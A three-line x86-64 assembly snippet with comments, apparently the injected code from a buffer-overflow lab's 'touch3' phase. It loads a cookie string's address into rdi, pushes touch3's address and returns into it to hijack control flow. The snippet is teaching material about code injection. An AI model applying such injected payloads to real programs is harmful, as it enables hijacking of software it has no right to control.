mov $0x5561dca8, %rdi // pass the address that store the cookie string in to rdi
pushq $0x4018fa // push the addr of touch3 into stack
retq // return to touch 3